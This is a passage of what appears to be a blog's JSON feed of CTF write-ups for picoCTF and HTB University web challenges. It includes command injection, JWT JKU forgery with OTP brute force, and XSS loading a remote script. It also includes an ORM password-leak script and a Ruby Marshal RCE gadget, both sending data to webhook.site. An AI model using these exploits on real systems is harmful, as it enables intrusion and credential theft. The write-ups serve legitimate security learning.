admin@ses\u0026#39; data = { \u0026#39;to\u0026#39;:\u0026#34;admin@ses\u0026#34;, \u0026#34;subject\u0026#34;: final_payload, \u0026#34;body\u0026#34;:\u0026#34;HI\u0026#34; } res= requests.post(url+\u0026#39;/api/send\u0026#39;,json=data,headers=headers) res= requests.post(url+\u0026#39;/api/admin_bot\u0026#39;,json=data,headers=headers) res= requests.post(url+\u0026#39;/api/admin_bot\u0026#39;,json=data,headers=headers) print(res.text) FINALLY # This is superhard challenges and i learn a lot from this. As well as some skill to test the app . This is too valuable\u0026hellip;\nSome questions ? # Why we need a JINJA spots for executing this vulnerabiliites ? And why injecting \u0026lsquo;\\n\u0026rsquo; in headers work but not \u0026lsquo;\\n\\n\u0026rsquo; ? Read the code lead us to result that there\u0026rsquo;s a simple check lines = string.splitlines() if lines: formatter.feed(\u0026#39;\u0026#39;, lines[0], charset) else: formatter.feed(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, charset) So we cannot separate our payload outside the HEADER section to pollute the BODY section . Furthermore, there\u0026rsquo;s something still in blackbox and I need time to figure it out. Just keep having fun. ","date":"25 March 2025","externalUrl":null,"permalink":"/posts/pico/","section":"Posts","summary":"Secure Email Service # This is the hardest web challenge from picoCTF. Knowledge : MIME email document structure, Signed Email, Header Injection, Breaking weak cryptography.\nFind the sink : # So the challenge gives us a bot with flag in localStorage and does some stuffs. from os import environ from playwright.async_api import async_playwright, expect import asyncio import re flag = environ.get(\u0026#39;FLAG\u0026#39;, \u0026#39;picoCTF{flag}\u0026#39;) password = environ.get(\u0026#39;PASSWORD\u0026#39;, \u0026#39;admin@ses\u0026#39;) async def bot(): async with asyncio.","title":"PicoCTF 2025","type":"posts"},{"content":"","date":"25 March 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"25 March 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"25 March 2025","externalUrl":null,"permalink":"/categories/writeup/","section":"Categories","summary":"","title":"Writeup","type":"categories"},{"content":" Write ups HTB UNIVERSITY # Web armaxis # Logic is only thing\nOverview : # We are given a page and a email host to receive OTP. Main goal is to get access as an admin. We can abuse the forget password function to achieve change the admin password due to flaw in implementation.\nrouter.post(\u0026#34;/reset-password\u0026#34;, async (req, res) =\u0026gt; { const { token, newPassword, email } = req.body; // Added \u0026#39;email\u0026#39; parameter if (!token || !newPassword || !email) return res.status(400).send(\u0026#34;Token, email, and new password are required.\u0026#34;); try { const reset = await getPasswordReset(token); if (!reset) return res.status(400).send(\u0026#34;Invalid or expired token.\u0026#34;); const user = await getUserByEmail(email); if (!user) return res.status(404).send(\u0026#34;User not found.\u0026#34;); await updateUserPassword(user.id, newPassword); await deletePasswordReset(token); res.send(\u0026#34;Password reset successful.\u0026#34;); } catch (err) { console.error(\u0026#34;Error resetting password:\u0026#34;, err); res.status(500).send(\u0026#34;Error resetting password.\u0026#34;); } }); It doesnt check the email after all :v so we just get token sent to our email and submit with email of admin. Then we get access !!! Admin # As an admin, we have more functions which is creating weapon and use MARKDOWN to note it. Here is logic:\nfunction parseMarkdown(content) { if (!content) return \u0026#39;\u0026#39;; return md.render( content.replace(/\\!\\[.*?\\]\\((.*?)\\)/g, (match, url) =\u0026gt; { try { const fileContent = execSync(`curl -s ${url}`); const base64Content = Buffer.from(fileContent).toString(\u0026#39;base64\u0026#39;); console.log(\u0026#34;IMAGE\u0026#34;) return `\u0026lt;img src=\u0026#34;data:image/*;base64,${base64Content}\u0026#34; alt=\u0026#34;Embedded Image\u0026#34;\u0026gt;`; } catch (err) { console.error(`Error fetching image from URL ${url}:`, err.message); console.log(\u0026#34;P TAG\u0026#34;) return `\u0026lt;p\u0026gt;Error loading image: ${url}\u0026lt;/p\u0026gt;`; } }) ); } It puts our url into a execSync ? So vulnearble to command injection.And that regrex simply cannot stop us ! We can put something like : $url = \u0026#34;; cat\u0026#39;/flag.txt\u0026#39;\u0026#34; And our result will be base64 encoded , we just easily decode and get the result; And get the result Decode and get flag : Web Breaking Bank # HTB challenge Knowledge : JKU vulnerabilities Goal # To get the flag , we need to login as finacial email and then dumps all money to get the flag :v import { getBalancesForUser } from \u0026#39;../services/coinService.js\u0026#39;; import fs from \u0026#39;fs/promises\u0026#39;; const FINANCIAL_CONTROLLER_EMAIL = \u0026#34;financial-controller@frontier-board.htb\u0026#34;; /** * Checks if the financial controller\u0026#39;s CLCR wallet is drained * If drained, returns the flag. */ export const checkFinancialControllerDrained = async () =\u0026gt; { const balances = await getBalancesForUser(FINANCIAL_CONTROLLER_EMAIL); const clcrBalance = balances.find((coin) =\u0026gt; coin.symbol === \u0026#39;CLCR\u0026#39;); if (!clcrBalance || clcrBalance.availableBalance \u0026lt;= 0) { const flag = (await fs.readFile(\u0026#39;/flag.txt\u0026#39;, \u0026#39;utf-8\u0026#39;)).trim(); return { drained: true, flag }; } return { drained: false }; }; OVERVIEW # This challenge use JWT to check the email with an unexploitable secret key. But this uses RSA- 256 algorithms so we have this page: export const createToken = async (payload) =\u0026gt; { const privateKey = await getPrivateKey(); return jwt.sign(payload, privateKey, { algorithm: \u0026#39;RS256\u0026#39;, header: { kid: KEY_ID, jku: JWKS_URI, }, }); }; It create jwt with a JKU !! JKU is a header to specify the position for jwt to extract the PUBLIC KEY to sign the data. But it is polluted with open redirect !!It blocks the open redirect. if (!jku.startsWith(\u0026#39;http://127.0.0.1:1337/\u0026#39;)) { throw new Error(\u0026#39;Invalid token: jku claim does not start with http://127.0.0.1:1337/\u0026#39;); } if (!kid) { throw new Error(\u0026#39;Invalid token: Missing header kid\u0026#39;); } if (kid !== KEY_ID) { return new Error(\u0026#39;Invalid token: kid does not match the expected key ID\u0026#39;); } But there is a vulnerable route can help us.\nfastify.get(\u0026#39;/redirect\u0026#39;, async (req, reply) =\u0026gt; { const { url, ref } = req.query; if (!url || !ref) { return reply.status(400).send({ error: \u0026#39;Missing URL or ref parameter\u0026#39; }); } // TODO: Should we restrict the URLs we redirect users to? try { await trackClick(ref, decodeURIComponent(url)); reply.header(\u0026#39;Location\u0026#39;, decodeURIComponent(url)).status(302).send(); } catch (error) { console.error(\u0026#39;[Analytics] Error during redirect:\u0026#39;, error.message); reply.status(500).send({ error: \u0026#39;Failed to track analytics data.\u0026#39; }); } }); It doesnt check the redirect so we can abuse this and perform an JKU redirect to our own PUBLIC key.\nLet\u0026rsquo;s do it # First create my own jwks.json. You can just use some tools to create it.\n{ \u0026#34;keys\u0026#34;: [ { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;use\u0026#34;: \u0026#34;sig\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;c709d578-666c-4683-84fb-f505652e6420\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;rGUZNQp2-rW1m4nlKqcFeAeWekWYreyqRsVb3keRnOPqZttlvpE5_gkQnmYMo0n0FHmgfeHHcFXNqXLpy2ZvfOr5EGRtk4sJXeLgTdHYukH3VrdGpIOyyTsOEFsCcHGamNGHUqdKRcEkVKdRzHkhjsEOMW6_APgS0ukqiKHBuiaspIQUiIS7xsna8x6Zh8R2COATOsSH2ae6PXBTaPzoaf13SdZvAvAfBBC7xJk6KQwdV99pazvJnh6c5GbIpVPle694cy8oDQ8gDtaOIOy4TTbT7aHB0eiSvpSGfEAqIXj8kWyiFNZHeCWTYm0_ly7Pn2JhNYkp25bv8nwXICoKpQ\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34; } ] } Then you use your own public key and private key to sign a new data (remember to change the kid==orignal kid) Here is the full script exploit :\nimport requests url = \u0026#39;http://localhost:1337\u0026#39; res = requests.post(url+\u0026#39;/api/auth/register\u0026#39;,json={\u0026#34;email\u0026#34;:\u0026#34;123@gmail.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123\u0026#34;}) token=\u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImM3MDlkNTc4LTY2NmMtNDY4My04NGZiLWY1MDU2NTJlNjQyMCIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hcGkvYW5hbHl0aWNzL3JlZGlyZWN0P3JlZj1oaWhpJnVybD1odHRwOi8vYW5ub3llZC1kZXNpZ24uc3VyZ2Uuc2gvandrcy5qc29uIn0.eyJlbWFpbCI6ImZpbmFuY2lhbC1jb250cm9sbGVyQGZyb250aWVyLWJvYXJkLmh0YiIsImlhdCI6MTczNDUxODk3Mn0.V83p1kybpP1QLVG0oZvaXyygy-EABntI2c-c3s1-y6dTSZsMXOVZYh9CcGyi8hEnv4dlqxhsm8_CBc7_KsxYbzIauzOFAzfiEHQ6oDo889mDjbeBb-JB1zNOohrOFih27BUKhXtOakn89LnBoR6tIlhISHbjvJpCOmN8Uxb2v56WatmTQBut6GkeAQN9_u0hWeYsIxHPIhPfvg_S1BbXtROXiPy-0aCI67pzmr8sgB5GZRyF5lKpq5w9iQ6BfQC8fosNfsI_g60Nh-xtUyiDIOFyukbLggesTOVzgJQ5VPy853VqDkRj39rxeIH5nbztHwdQiw5RyFvQQCOkWCkqiA\u0026#34; headers ={ \u0026#34;Authorization\u0026#34;:\u0026#34;Bearer \u0026#34;+ token } coins = requests.get(url+\u0026#39;/api/crypto/balance\u0026#39;,headers=headers).json()[0][\u0026#39;availableBalance\u0026#39;] print(coins) def generate_all_4_digit_combinations(): combinations = [] for i in range(10000): combinations.append(str(i).zfill(4)) return combinations // Easy bypass OTP here all_combinations = generate_all_4_digit_combinations() dataTransaction = { \u0026#34;to\u0026#34;:\u0026#34;123@gmail.com\u0026#34;, \u0026#34;amount\u0026#34;:coins, \u0026#34;coin\u0026#34;:\u0026#39;CLCR\u0026#39;, \u0026#34;otp\u0026#34;:\u0026#39;\u0026#39;.join(all_combinations) } res = requests.post(url+\u0026#39;/api/crypto/transaction\u0026#39;,json=dataTransaction,headers=headers) res = requests.get(url+\u0026#39;/api/dashboard\u0026#39;,headers=headers) print(res.text) FLAGGG Conclusion # The source is too long , and consumes me so much time to find out :vvv\nContract Front End Write ups # HTB challenge. Knowlegde :\nWeb cache deception ORM Leaks Xss with missing charset Insecure Deserialization in Marshal A bunch of researches is pushed into this CTF :v Overview : # We will have a flag stored at \u0026lsquo;/\u0026rsquo; and we need to find some ways to trigger a execution We are given a big source code but we focus on somethings : There are 3 privileges: guest, contract_manager, admin. We will try to gain the admin privilege first. So let\u0026rsquo;s go. Source code : # Focus on how to get contract_manager first :v\ndef get_contract_manager_password(): try: contract_manager = User.objects.get(username=\u0026#34;contract_manager\u0026#34;) return contract_manager.password except User.DoesNotExist: raise ValueError(\u0026#34;Contract Manager user does not exist in the database\u0026#34;) def startChromiumBot(url): print(url, file=sys.stdout) chrome_options = Options() chrome_options.binary_location = \u0026#34;/usr/bin/chromium-browser\u0026#34; chrome_options.add_argument(\u0026#34;--headless\u0026#34;) chrome_options.add_argument(\u0026#34;--no-sandbox\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-dev-shm-usage\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-gpu\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-software-rasterizer\u0026#34;) chrome_service = Service(\u0026#34;/usr/bin/chromedriver\u0026#34;) driver = webdriver.Chrome(service=chrome_service, options=chrome_options) try: driver.get(\u0026#39;http://127.0.0.1:1337/login\u0026#39;) WebDriverWait(driver, 15).until( EC.presence_of_element_located((By.ID, \u0026#34;loginBtn\u0026#34;)) ) username = \u0026#34;contract_manager\u0026#34; password = get_contract_manager_password() input1 = driver.find_element(By.XPATH, \u0026#39;/html/body/code/section/div/div/div/form/div[1]/input\u0026#39;) input2 = driver.find_element(By.XPATH, \u0026#39;/html/body/code/section/div/div/div/form/div[2]/input\u0026#39;) # Can i abuse this to get password input1.send_keys(username) input2.send_keys(password) submit_button = driver.find_element(By.ID, \u0026#34;loginBtn\u0026#34;) driver.execute_script(\u0026#34;arguments[0].click();\u0026#34;, submit_button) driver.get(url) time.sleep(30) finally: driver.quit() -\u0026gt; This will create a contract_manager account and use it as a bot and then visit our website. We cannot really stole the cookie due to http only but if we can xss , we can call any command of a contract_manager which we wil talk later after finding xss.\nFinding XSS # So this is the first time I try xss in ruby so i search something and it seems something like : \u0026lt;%= @a.html_safe %\u0026gt; This will be vulnerable to xss if we control the @a so I try to find that gadget and there is something here: # app/helpers/application_helper.rb module ApplicationHelper def render_markdown(text) return \u0026#39;\u0026#39; if text.nil? # Return an empty string if text is nil # Configure Redcarpet to render Markdown with links and images enabled renderer = Redcarpet::Render::HTML.new(filter_html: true) markdown = Redcarpet::Markdown.new(renderer, { no_intra_emphasis: true, autolink: true, tables: true, fenced_code_blocks: true, disable_indented_code_blocks: true, strikethrough: true, superscript: true }) # Render Markdown to HTML markdown.render(text).html_safe end end Yeh , so we find a markdown xss vulnerabilities here. It is rendered in /settings template. Importantly, It will filter all HTML tag and just left the images and link. So now add some javascript link [abc](javascript:alert\u0026#39;1\u0026#39;) Well we have xss but it seems a self xss and we cannot call anything like onerror automatically. But then you can find something interesting in the source code at # lib/remove_charset_middleware.rb class RemoveCharsetMiddleware def initialize(app) @app = app end def call(env) status, headers, response = @app.call(env) headers[\u0026#34;Content-Type\u0026#34;] = headers[\u0026#34;Content-Type\u0026#34;].sub(/; charset=.*$/, \u0026#39;\u0026#39;) if headers[\u0026#34;Content-Type\u0026#34;] [status, headers, response] end end You can see , there is no charset specified !! Damnn, xss with missing charset comes into the play. Just try some \\x1b$B and \\x1b(B now bro. Here we get ISO-2022-JS ~~ !!. So this time to configure a payload to call an onerror. After a long time, it will be : bio: ![\\x1B$@](abc)+\\x1B(B+![abc](onerror=alert//) \u0026mdash;\u0026raquo; Now we have XSS !!!!\nHow to this XSS trigger the contract_manager # Another problem is how this xss can be visited by contract_manager ? It is depended on our session and render each own settings right ? So how can it is possible . Now we come to a new technique called Web Cache Depception , you can see this video for more understand. server { listen 1337; server_name _; # Proxy server forward to localhost:3000 and cache possible location ~ \\.(css|js|jpg|jpeg|png|gif|ico|woff|woff2|ttf|svg|eot|html|json)$ { proxy_cache my_cache; proxy_cache_key \u0026#34;$uri$is_args$args\u0026#34;; proxy_cache_valid 200 5m; proxy_cache_valid 404 1m; proxy_pass http://127.0.0.1:3000; proxy_set_header Host $http_host; # Pass original host and port proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_http_version 1.1; add_header X-Cache-Status $upstream_cache_status; } location / { proxy_pass http://127.0.0.1:3000; proxy_set_header Host $http_host; # Pass original host and port proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_http_version 1.1; add_header X-Cache-Status $upstream_cache_status; } } This is configure to cache our data through a proxy server before forwarding to server. Let me simply explain how web cache works.\nFirst it will check the filename fetched extension before caching it, if the cache isn\u0026rsquo;t storing any thing , forward the requests to server and get the response then store response cache. Any time after this , ANOTHER calls to the same resources, it will check from cache first and receive data from cache. But we call poison the cache with OUR XSS PAYLOAD !!!. We can find some bypass based on difference of parsing delemiter between nginx and and ruby. (delimiter in ruby is \u0026ldquo;.\u0026rdquo;) So if we call a request like \u0026ldquo;/settings.ico\u0026rdquo; this will matches with \u0026ldquo;/settings\u0026rdquo; in ruby !! But it will be cached in proxy cache server !! We can test it with simple call a GET requests to /settings.ico\nBefore caching : Successfully caching : Now everyone gets into settings.ico will be poisonous with our xss !! And as well as the CONTRACT_MANAGER Gain access as a contract_manager partly # We had XSS but we cannot stole the cookies like I said before. But we can also call every routes of a contract_manager !! So let\u0026rsquo;s login as a contract_manager with our Docker for a faster investigate. AS a contact_manager, we have only new Features is FILTERING http://localhost:1337/contracts/manage?title__contains=\u0026amp;status=\u0026amp;start_date=\u0026amp;end_date= So let\u0026rsquo;s read the source to find some vulnerabilites\nclass FilteredContractsView(APIView): permission_classes = [IsAuthenticated, IsContractManagerOrAdmin] def post(self, request, format=None): try: if request.data.get(\u0026#34;all\u0026#34;) == True: contracts = Contract.objects.all() else: filtered_data = {key: value for key, value in request.data.items() if key != \u0026#34;all\u0026#34;} contracts = Contract.objects.filter(**filtered_data) serializer = ContractSerializer(contracts, many=True) except Exception as e: return Response({\u0026#34;error\u0026#34;: str(e)}, status=status.HTTP_400_BAD_REQUEST) return Response(serializer.data, status=status.HTTP_200_OK) This app handles SQL with a django ORM. When apply a filter function the syntax for example : products = Product.objects.filter(name=\u0026#39;Laptop\u0026#39;) But there is something leaked with\nfiltered_data = {key: value for key, value in request.data.items() if key != \u0026#34;all\u0026#34;} contracts = Contract.objects.filter(**filtered_data) We can handle our choice to select !!! You can read more here to better understand https://www.elttam.com/blog/plormbing-your-django-orm/\nNow we need to find what we can leak here by reading it\u0026rsquo;s relationship establishment. owner = models.ForeignKey( settings.AUTH_USER_MODEL, on_delete=models.CASCADE, related_name=\u0026#39;contracts\u0026#39;, help_text=\u0026#34;User who owns the contract\u0026#34; ) In the Contract model , it has a field owner who owns the contracts !! And we can leak the username password with owner__password__startswith= \u0026ldquo;randomCharHere\u0026rdquo; like boolean search. Here is exploit :\nchars = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; adminPassword =\u0026#34;\u0026#34; webhook = \u0026#34;https://webhook.site/307dd0c2-4733-4e45-954a-009ff8242f3a?a=\u0026#34; function leak(adminPassword) { if(adminPassword.length == 32) { fetch(webhook+adminPassword) } for (let char of chars) { fetch(url+adminPassword+char) .then(data=\u0026gt;data.text()) .then((data)=\u0026gt;{ if(!data.includes(\u0026#34;No contracts found based on the current filter.\u0026#34;)){ adminPassword+=char console.log(adminPassword) leak(adminPassword) } }) } } leak(adminPassword) Now we test this script on Dev tools And receive admin password at webhook : Now combine this with our xss before to create a malicous script src !! Then report it and receive admin pasword !! bio : ![\\x1B$@](abc)+\\x1B(B+![abc](onerror=s=document.createElement(\u0026#39;script\u0026#39;);s.src=\u0026#39;http://garrulous-protest.surge.sh/payload.js\u0026#39;;document.body.appendChild(s);//) We successfully leak the admin password so let\u0026rsquo;s login in ADMIN PRIVILEGE # As admin we have the new feature is CONTRACT TEMPLATES.\n# Contract template controllers def create user_data = current_user unless user_data \u0026amp;\u0026amp; user_data[\u0026#39;id\u0026#39;] flash[:alert] = \u0026#34;User must be logged in to create a template.\u0026#34; redirect_to login_path and return end serialized_content = Marshal.dump(params[:content]) response = HTTP.auth(\u0026#34;Token #{session[:token]}\u0026#34;).post(\u0026#34;http://localhost:8080/api/contract_templates/\u0026#34;, json: { data: serialized_content, user_id: user_data[\u0026#39;id\u0026#39;] }.merge(params.to_unsafe_h)) if response.status.success? flash[:notice] = \u0026#34;Template created successfully.\u0026#34; redirect_to contract_templates_path else flash.now[:alert] = \u0026#34;Failed to create template.\u0026#34; render :new end end def show response = HTTP.auth(\u0026#34;Token #{session[:token]}\u0026#34;).get(\u0026#34;http://localhost:8080/api/contract_templates/#{params[:id]}/\u0026#34;) if response.status.success? @template = response.parse content = Marshal.load(@template[\u0026#39;data\u0026#39;]) if @template[\u0026#39;data\u0026#39;] @template[\u0026#39;id\u0026#39;] ||= params[:id] @template[\u0026#39;name\u0026#39;] ||= \u0026#39;Unnamed Template\u0026#39; @template[\u0026#39;description\u0026#39;] ||= \u0026#39;No description provided.\u0026#39; @template[\u0026#39;data\u0026#39;] = content @template[\u0026#39;created_at\u0026#39;] ||= Time.current.to_s else redirect_to contract_templates_path, alert: \u0026#34;Template not found.\u0026#34; end endk When creating a content , it will serialize our data but it seems can be changed with our params cause using merge function?? Is the ruby is vulnerable to Insecure Serialization ? Well doing some reasearch, and the answer is yesss !!! So here is the key to execute code to read file flag. The hard things # Well so the main idea of Insecure Deserialization is find some gadget to call require to some sink function. This is really hard to find it in a CTF challenge, but it is lucky that there are many researcher find this for us. We can use this right now and I will spend sometime to research it latter . :v And here is the POC for that . https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb Apply this we get the payload : #!/usr/bin/python3 import requests from bs4 import BeautifulSoup username = \u0026#34;admin\u0026#34; password = ADMIN_PASSWORD base_url = \u0026#34;http://127.0.0.1:1337\u0026#34; session = requests.Session() def getAuthenToken(html): soup = BeautifulSoup(html, \u0026#34;html.parser\u0026#34;) return soup.find(\u0026#34;input\u0026#34;, {\u0026#34;name\u0026#34;: \u0026#34;authenticity_token\u0026#34;})[\u0026#34;value\u0026#34;] login_page = session.get(f\u0026#34;{base_url}/login\u0026#34;) login_page.raise_for_status() authenticity_token = getAuthenToken(login_page.text) login_payload = { \u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password, \u0026#34;authenticity_token\u0026#34;: authenticity_token } ## LOGIN AS ADMIN response = session.post(f\u0026#34;{base_url}/login\u0026#34;, data=login_payload) response.raise_for_status() ## GET RCE content_data = \u0026#34;04085b07631547656d3a3a5370656346657463686572553a1147656d3a3a56657273696f6e5b066f3a1e47656d3a3a526571756573745365743a3a4c6f636b66696c650a3a09407365746f3a1447656d3a3a52657175657374536574063a1540736f727465645f72657175657374735b076f3a2547656d3a3a5265736f6c7665723a3a5370656353706563696669636174696f6e063a0a40737065636f3a2447656d3a3a5265736f6c7665723a3a47697453706563696669636174696f6e073a0c40736f75726 3656f3a1547656d3a3a536f757263653a3a4769740a3a09406769744922087a6970063a0645543a0f407265666572656e63654922102f6574632f706173737764063b10543a0e40726f6f745f6469724922092f746d70063b10543a10407265706f7369746f7279492208616e79063b10543a0a406e616d65492208616e79063b10543b0b6f3a2147656d3a3a5265736f6c7665723a3a53706563696669636174696f6e073b14492208616e79063b10543a1240646570656e64656e636965735b006f3b0a063b0b6f3b0c073b0d6f3b0e0a3b0f4922087a6970063b10543b114922652d546d54543d222428776765742068747470733a2f2f776562686f6f6b2e736974652f33303764643063322d343733332d346534352d393534612d3030396666383234326633613f613d60636174202f666c61672e747874602922612e7a6970063b10543b124922092f746d70063b10543b13492208616e79063b10543b14492208616e79063b10543b0b6f3b15073b14492208616e79063b10543b165b003b165b003a134067656d5f646570735f66696c6549220a2f726f6f74063b10543a124067656d5f646570735f6469724922062f063b10543a0f40706c6174666f726d735b00\u0026#34; byte_data = bytes.fromhex(content_data) contracts_page = session.get(f\u0026#34;{base_url}/contract_templates/new\u0026#34;) contracts_page.raise_for_status() authenticity_token = getAuthenToken(contracts_page.text) contracts_payload = { \u0026#34;authenticity_token\u0026#34;: authenticity_token, \u0026#34;name\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;commit\u0026#34;: \u0026#34;Create Template\u0026#34;, \u0026#34;data\u0026#34;:byte_data } response = session.post(f\u0026#34;{base_url}/contract_templates\u0026#34;, data=contracts_payload) And the flag !! Conclusion # This is a big chain of vulnerabilities and modern attacks skills. I cannot solve this by myself but the write ups helps me alot. I still need to read about the research of ORM leaks, Marshal latter when I have free time :Vvv Web - Intergalactic Bounty # Hard challenge from HTB University Knowledge: Email disparency, Prototype pollution, Needle\nOverview # Firstly, we have an login page where we must register with an account and our given email is test@email.htb Here is the logic for register. It seems just accept the domain interstellar.htb. const registerAPI = async (req, res) =\u0026gt; { const { email, password, role = \u0026#34;guest\u0026#34; } = req.body; const emailDomain = emailAddresses.parseOneAddress(email)?.domain; if (!emailDomain || emailDomain !== \u0026#39;interstellar.htb\u0026#39;) { return res.status(200).json({ message: \u0026#39;Registration is not allowed for this email domain\u0026#39; }); } try { await User.createUser(email, password, role); return res.json({ message: \u0026#34;User registered. Verification email sent.\u0026#34;, status: 201 }); } catch (err) { return res.status(500).json({ message: err.message, status: 500 }); } }; Specially it uses email-address library to parse the email . const emailAddresses = require(\u0026#39;email-addresses\u0026#39;); We can read this from the manual page of email-address It supports the RFC 5322 and gives us an interesting email format: \u0026ldquo;BOB example\u0026rdquo;\u0026lt;bop@example.com\u0026gt; ? This looks really weird at first sight. With the text in \u0026quot;\u0026quot; is a name of domain. Read more , we will see that the server again use other library to send email which is NodeMailer const transporter = nodemailer.createTransport({ host: \u0026#34;127.0.0.1\u0026#34;, port: 1025, secure: false, }); const sendVerificationEmail = async (email, code) =\u0026gt; { const mailOptions = { from: \u0026#34;no-reply@interstellar.htb\u0026#34;, to: email, subject: \u0026#34;Email Verification\u0026#34;, html: `Your verification code is: ${code}`, }; try { await transporter.sendMail(mailOptions); console.log(`Verification email sent to ${email}`); } catch (error) { console.error(\u0026#34;Error sending email:\u0026#34;, error); throw new Error(\u0026#34;Unable to send verification email\u0026#34;); } }; Then i try this payload and it works.((I will explain later)) email :\u0026#39; \u0026#34;test@email.htb\u0026#34; @interstellar.htb\u0026#39; But this wont work ( JUST A SPACE )\nemail :\u0026#39; \u0026#34;test@email.htb\u0026#34;@interstellar.htb\u0026#39; This abuse the differences in ways of 2 library parses out our address !!! This will trickyly send to our email kkk !!!\nMoreover, in logic requests it seems something vulnerable when setting the default value without actually block it ! We can get admin privilege from this ! const { email, password, role = \u0026#34;guest\u0026#34; } = req.body; Now we try this : Register with role admin : Login with opt code received from email page: Now we are admins !!! # Let find out what we can do now . We have just some thing interesting ! const transmitAPI = async (req, res) =\u0026gt; { const { url } = req.body; if (!url) { return res.status(400).json({ message: \u0026#34;URL is required\u0026#34; }); } const responseBody = await fetchURL(url); res.status(200).json({ message: \u0026#34;Request successful\u0026#34;, responseBody, }); }; const editBountiesAPI = async (req, res) =\u0026gt; { const { ...bountyData } = req.body; try { const data = await BountyModel.findByPk(req.params.id, { attributes: [ \u0026#34;target_name\u0026#34;, \u0026#34;target_aliases\u0026#34;, \u0026#34;target_species\u0026#34;, \u0026#34;last_known_location\u0026#34;, \u0026#34;galaxy\u0026#34;, \u0026#34;star_system\u0026#34;, \u0026#34;planet\u0026#34;, \u0026#34;coordinates\u0026#34;, \u0026#34;reward_credits\u0026#34;, \u0026#34;reward_items\u0026#34;, \u0026#34;issuer_name\u0026#34;, \u0026#34;issuer_faction\u0026#34;, \u0026#34;risk_level\u0026#34;, \u0026#34;required_equipment\u0026#34;, \u0026#34;posted_at\u0026#34;, \u0026#34;status\u0026#34;, \u0026#34;image\u0026#34;, \u0026#34;description\u0026#34;, \u0026#34;crimes\u0026#34;, \u0026#34;id\u0026#34;, ], }); if (!data) { return res.status(404).json({ message: \u0026#34;Bounty not found\u0026#34; }); } const updated = mergedeep(data.toJSON(), bountyData); await data.update(updated); return res.json(updated); } catch (err) { console.log(err); return res.status(500).json({ message: \u0026#34;Error fetching data\u0026#34; }); } }; We will have 2 main controllers :\nTransmit API will make a requests to our given url with needle library ? It looks really weird and maybe some hints of this ctf. EditBountyApis will merge our data with an object ?? Damn, its really clear that here is an Prototype Pollution attack and we need to find some gadgets and maybe it will be exist in the needle. const fetchURL = async (url) =\u0026gt; { if (!url.startsWith(\u0026#34;http://\u0026#34;) \u0026amp;\u0026amp; !url.startsWith(\u0026#34;https://\u0026#34;)) { throw new Error(\u0026#34;Invalid URL: URL must start with http or https\u0026#34;); } const options = { compressed: true, follow_max: 0, }; return new Promise((resolve, reject) =\u0026gt; { needle.get(url, options, (err, resp, body) =\u0026gt; { if (err) { return reject(new Error(\u0026#34;Error fetching the URL: \u0026#34; + err.message)); } resolve(body); }); }); }; The needle will call get with url , options ,and a callbacks. After reading the needle library, it seems interesting here. We can use the attribute output to write a any file !!!! So combine this with the prototype pollution we can achive this easily with :\n\u0026#34;__proto__\u0026#34;:{ \u0026#34;output\u0026#34;:\u0026#34;/app/views/index.html\u0026#34; } // Write into template files to receive easily Lets polluted the options : Now whatever we receive from the calling transmit API will be stored in /app/views/index.html which we can see it !!!Just host a simple page with the payload :\n{{range.constructor(\u0026#34;return global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;tail /flag.txt\u0026#39;)\u0026#34;)()}} Finally, send this through our url . We overwrite this !!! Now lets check the index.html Ehh ?? It looks unupdated :vv But in docker it get changed !! Maybe we need to triger and update in our app In the config :\n[program:node] directory=/app command=node index.js autostart=true autorestart=true stdout_logfile=/dev/stdout stdout_logfile_maxbytes=0 stderr_logfile=/dev/stderr stderr_logfile_maxbytes=0 Our app is allowed to restart, so we need to trigger this. We need to make a crash or execption.\nconst transmitAPI = async (req, res) =\u0026gt; { const { url } = req.body; if (!url) { return res.status(400).json({ message: \u0026#34;URL is required\u0026#34; }); } const responseBody = await fetchURL(url); res.status(200).json({ message: \u0026#34;Request successful\u0026#34;, responseBody, }); }; We can abuse this because it doesnt catch any exception. Just send random URL ANd get the FLAGGGGGGG Thats the end of challenge :v Research about NodeMailer behaviours # Now I will explain why our email works. email = \u0026#34;test@email.htb\u0026#34; @interstellar.htb I read the source code of nodemailer to figure out this. You could try too at here. I wont refer to the way of express-addresses work because it just follow the RFC 5322 and our email will be parsed with domain \u0026ldquo;@interstellar.htb\u0026rdquo; as expected. So I just focus on the nodemailer Main steps # First the command will tokenize our address with following code: class Tokenizer { constructor(str) { this.str = (str || \u0026#39;\u0026#39;).toString(); this.operatorCurrent = \u0026#39;\u0026#39;; this.operatorExpecting = \u0026#39;\u0026#39;; this.node = null; this.escaped = false; this.list = []; /** * Operator tokens and which tokens are expected to end the sequence */ this.operators = { \u0026#39;\u0026#34;\u0026#39;: \u0026#39;\u0026#34;\u0026#39;, \u0026#39;(\u0026#39;: \u0026#39;)\u0026#39;, \u0026#39;\u0026lt;\u0026#39;: \u0026#39;\u0026gt;\u0026#39;, \u0026#39;,\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;:\u0026#39;: 